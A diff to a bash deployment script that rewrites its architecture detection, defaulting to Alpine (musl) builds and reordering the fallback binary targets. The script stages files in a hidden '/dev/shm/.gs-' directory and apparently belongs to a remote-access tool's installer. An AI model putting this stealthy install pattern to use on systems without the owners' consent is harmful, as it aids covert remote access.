@@ -107,20 +107,10 @@ init_vars()
 	local arch
 	arch=$(uname -m)
 	if [[ $OSTYPE == *linux* ]]; then 
-		if [[ x"$arch" == "xi686" ]]; then
-			if [[ $(uname -r) == *arch* ]]; then
-				OSARCH="i686-arch"
-			else
-				OSARCH="i686-debian"
-			fi
+		if [[ x"$arch" == "xi686" ]] || [[ x"$arch" == "xi386" ]]; then
+			OSARCH="i386-alpine"
 		elif [[ x"$arch" == "xarmv6l" ]]; then
 			OSARCH="armv6l-linux"
-		else
-			if grep Arch /etc/issue &>/dev/null; then
-				OSARCH="x86_64-arch"
-			else
-				OSARCH="x86_64-debian"
-			fi
 		fi
 	elif [[ $OSTYPE == *darwin* ]]; then
 			OSARCH="x86_64-osx"
@@ -130,10 +120,7 @@ init_vars()
 			OSARCH="x86_64-cygwin"
 	fi
 
-	if grep Alpine /etc/issue &>/dev/null; then
-		OSARCH="x86_64-alpine"
-	fi
-	[[ -z "$OSARCH" ]] && OSARCH="x86_64-debian" # Try debian 64bit as last resort
+	[[ -z "$OSARCH" ]] && OSARCH="x86_64-alpine" # Default: Try Alpine(muscl libc) 64bit
 
 	if [[ -d /dev/shm ]]; then
 		TMPDIR="/dev/shm/.gs-${UID}"
@@ -628,7 +615,7 @@ try()
 # binaries and fail hard if none could be found.
 try_any()
 {
-	targets="x86_64-debian i386-debian i686-arch x86_64-alpine i686-debian x86_64-centos"
+	targets="x86_64-alpine i386-alpine x86_64-debian armv6l-linux x86_64-cygwin x86_64-freebsd x86_64-osx"
 	for osarch in $targets; do
 		[[ x"$osarch" = x"$OSARCH" ]] && continue # Skip the default OSARCH (already tried)
 		try "$osarch"
